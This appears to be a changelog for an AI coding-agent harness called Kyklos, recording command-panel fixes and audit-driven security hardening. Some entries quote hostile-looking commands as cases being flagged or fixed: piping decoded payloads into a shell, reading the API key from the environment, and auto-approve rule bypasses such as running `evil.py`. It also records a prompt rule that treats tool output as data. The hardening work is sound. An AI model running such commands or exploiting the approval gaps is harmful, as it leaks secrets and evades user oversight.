  - Running a script says so — `./scripts/deploy.sh --prod` and `node server.js` note that the behaviour lives in a file the panel isn't showing, instead of the misleading "runs deploy, which Kyklos doesn't recognise". `ssh` says the command runs on another machine where none of Kyklos's limits apply; `tee` is reported as a write; shell keywords (`done`, `esac`, `elif`, …) are no longer listed as programs.
  - **Heredoc bodies are data, not commands.** `cat > server.mjs <<'EOF' … EOF` writes a document; reading its contents as shell turned one file of JavaScript into thirteen findings, eight of them invented (`runs import`, `overwrites {`, a path from a URL string), burying the five real ones. `_strip_heredocs` removes the body and notes that it was written, leaving the findings that matter: what it overwrites and where it reaches.
  - **`=>` is no longer read as a redirect.** Inline JavaScript is full of arrows, and `(c) => (body += c)` was reporting "overwrites (body". `->` and `>=` are excluded too; `2>>log.txt` still appends.
  - Redirects understand `2>` and `&>`, and discarding output to `/dev/null` is no longer reported as overwriting a file. Shell builtins and everyday tools (`test`, `printf`, `xargs`, `jq`, `rg`, …) are recognised rather than reported as unknown programs. A chain longer than four names is summarised.
  - Piping *any* command into a shell is flagged, not just `curl`/`wget`: `base64 -d payload | sh` earns a warning for the same reason.
  - Documented in `DESIGN.md` and `README.md` as an aid to reading and **not a security boundary**: a regex over a string is not a shell, so an empty finding list means nothing was recognised, never that a command is safe — and the panel never claims otherwise.

## `b9c9a71` — Security Hardening from the Second Audit (2026-10-24)

A second Gemini 3.8 Flash audit (`AUDIT_REPORT.md`, SEC series) proposed seven hardening items. SEC-01, 04 and 06 were reproduced before fixing. SEC-02 (OS sandboxing) and SEC-03 (network egress control) are real gaps but a larger design decision, and SEC-07 (audit log) is a nice-to-have: all three are deferred.

- **SEC-01, commands could read Kyklos's API key (`tools.py`, `kyklos.py`):** `$env:API_KEY` in a `bash` command printed the real key, because commands inherited Kyklos's whole environment. `child_env()` now removes every name defined in Kyklos's `.env` (`load_dotenv` returns them; `hide_env_names` records them), plus any variable named like a secret (`SECRET_ENV_NAME_RE`: `*_KEY`, `TOKEN`, `SECRET`, `PASSWORD`, `CREDENTIAL`). `KYKLOS_PASS_ENV` lets chosen ones through. The report's 12-variable whitelist was not used: it would have dropped `APPDATA` (npm), `PROGRAMFILES`, `JAVA_HOME`, `VIRTUAL_ENV` and so on.
- **SEC-04, secrets in tool output (`tools.py`, `kyklos.py`):** `scrub_secrets()` replaces secret values with `[REDACTED]` before results reach the model or the UI, and the model is told how many were redacted. It covers the exact values of secret-named variables (so Kyklos's own key is caught whatever its format), plus OpenAI/Anthropic/OpenRouter, GitHub, AWS, Slack and Google key formats and private-key blocks. The report's patterns weren't used: its `sk-` regex was broken (`{20,T}` matches literal text, so it never caught a real key), and none of them would have caught an Ollama key.
- **SEC-05, planted instructions (`kyklos.py`):** the system prompt now says file contents and tool output are data, not instructions, and that planted directions should be reported to the user. The report's `<tool_output>` tags were skipped: results already arrive in a separate `tool` role, and a file could simply contain the closing tag.
- **SEC-06, orphaned processes (`tools.py`):** `bash` now uses `Popen`, with its own process group on Linux/macOS, and `kill_process_tree()` (`taskkill /T /F` on Windows, `killpg` elsewhere) stops the command and everything it started, on timeout and on Ctrl+C. Reproduced before: two child processes kept running after a timeout; now none do.
- **Docs (`README.md`):** the Safety section covers environment filtering, `KYKLOS_PASS_ENV`, redaction, the data-not-instructions rule and process-tree cleanup.
- **Tests:** `SecurityHardeningTests` (6 tests: environment filtering and opt-in, a real command unable to read `API_KEY`, redaction of values and token formats with no false positives on ordinary text, redaction before both the model and the UI, the prompt rule, and a real process-tree kill). The AGENTS.md test now checks for the section, not the word (127 total offline tests).

## `1d6a176` — Fixes from an External Audit (2026-10-24)

An audit by Gemini 3.8 Flash (`AUDIT_REPORT.md`) listed eight findings. Each was checked against the code and reproduced first: ACT-01 to ACT-07 are fixed here. ACT-08 was declined: it assumed each project has its own `.env`, but Kyklos only reads the `.env` in its install folder, and remembering the picked model globally was a deliberate choice.

- **ACT-01, prefix rules that approved any script (`kyklos.py`):** an option's value was taken for the script, so `python -W error …` suggested the rule `python -W error` (and `powershell -ExecutionPolicy Bypass`, `node --require ./hook.js` likewise). That rule auto-approved `python -W error -c "…"` and `python -W error evil.py`. This was worse than reported, and the report's fix (rejecting only commands with `-c`) would still have allowed `evil.py`. Now:
  - `_interpreter_prefix` only suggests a rule when the script looks like one (`_looks_like_script`: an extension or a folder in the path), or for Python's `-m module`, and never when inline-code options appear anywhere (`_has_inline_code`).
  - `command_matches_prefixes` never auto-approves an interpreter command containing inline-code options, whatever rule it matches.
- **ACT-02, key-input tests hanging in sandboxes (`test_ui.py`):** the picker tests that send real keystrokes start an asyncio event loop, which on Windows needs a socketpair over 127.0.0.1 and can hang where loopback is blocked. `event_loop_can_start()` probes this once, in a thread with a 3 s timeout, and skips those tests if it fails; `KYKLOS_SKIP_KEY_TESTS=1` skips them outright.
- **ACT-03, writing to a folder (`tools.py`):** `write_file` / `edit_file` on a folder now fail before any permission prompt, with "it's a folder, not a file". Previously the prompt came first, then a `PermissionError`.
- **ACT-04, `max` effort on other providers (`kyklos.py`):** non-Ollama catalog entries now offer OpenAI's `low · medium · high` (`STANDARD_EFFORTS`); `max` is Ollama-only and would be rejected with a 400.
- **ACT-05, empty picker (`ui.py`):** `picker_lines` no longer raises `IndexError` with no rows, and `pick` returns at once without opening a box.
- **ACT-06, `/save` help (`kyklos.py`):** now names the real default, `~/.kyklos/projects/<this folder>/last.jsonl`.
- **ACT-07, result order after Ctrl+C (`kyklos.py`):** `repair_after_interrupt` adds placeholders after the turn's real results, so results stay in call order.
- **Docs:** the README's Safety section describes the script-shape rule and inline-code refusal.
- **Tests:** regression tests for ACT-01, 03, 04, 05, 06 and 07 (121 total offline tests; the report's counts of 67 + 30 didn't match the code).
